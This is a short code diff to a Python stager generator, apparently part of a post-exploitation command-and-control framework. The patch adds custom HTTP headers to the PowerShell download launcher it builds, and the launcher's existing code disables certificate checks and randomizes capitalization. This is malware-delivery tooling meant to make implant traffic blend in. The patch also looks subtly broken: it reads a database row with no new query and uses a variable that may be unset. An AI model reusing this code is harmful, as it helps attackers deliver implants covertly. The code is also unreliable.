@@ -34,6 +34,17 @@ class Stagers:
         cur.execute("SELECT install_path FROM config")
         self.installPath = cur.fetchone()[0]
 
+
+        res = cur.fetchone()[0]
+        self.userAgent = res.split("|")[1]
+        self.headers = []
+        if len(res.split("|")) > 2:
+            headersList = res.split("|")[2:]
+            for l in headersList:
+                h = l.split(":")
+                self.headers.append(h)
+
+
         cur.execute("SELECT default_profile FROM config")
         self.userAgent = (cur.fetchone()[0]).split("|")[1]
 
@@ -306,6 +317,8 @@ class Stagers:
         if userAgent.lower() == "default":
             userAgent = self.userAgent
 
+        if self.headers:
+        	headers = self.headers
         # get the launching URI
         URI = self.generate_launcher_uri(server, encode, pivotServer, hop)
 
@@ -316,6 +329,10 @@ class Stagers:
         if "https" in URI:
             # allow for self-signed certificates for https connections
             stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+        
+        if headers:
+        	for h in headers:
+        		stager += helpers.randomize_capitalization("$wc.Headers.Add('%s','%s');")%(h[0],h[1])
         
         if userAgent.lower() != "none" or proxy.lower() != "none":
             
